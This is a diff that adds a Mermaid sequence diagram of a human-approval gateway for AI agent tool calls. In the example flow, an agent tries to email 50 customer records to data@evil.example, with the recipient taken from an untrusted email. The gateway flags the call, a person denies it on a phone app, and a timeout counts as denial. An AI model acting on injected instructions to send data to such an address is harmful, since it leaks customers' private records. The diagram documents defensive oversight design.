@@ -1,0 +1,23 @@
+sequenceDiagram
+  autonumber
+  participant A as AI agent
+  participant G as Gateway
+  participant S as Approval service
+  participant N as Notifier (SSE + Web Push)
+  participant M as Approver PWA (phone)
+  actor H as Approver
+  participant L as Audit log
+  A->>G: send_email(to=data@evil.example, body=…)
+  G->>G: policy + taint → REQUIRE_APPROVAL
+  G->>L: tool_call.decision (require_approval)
+  G->>S: request(call, decision)
+  S->>S: plain-language summary (EN/AR)
+  S->>N: publish approval.requested
+  N-->>M: push notification + live update
+  M->>H: "Agent wants to email 50 customer records to an external address. Recipient came from an untrusted email."
+  H->>M: Deny (+ note)
+  M->>S: POST /api/approvals/{id}/decision
+  S-->>G: status = denied
+  G->>L: approval.decided
+  G-->>A: blocked: denied by human approver
+  Note over G,S: No decision before the timeout → EXPIRED → treated as DENY (fail-safe)
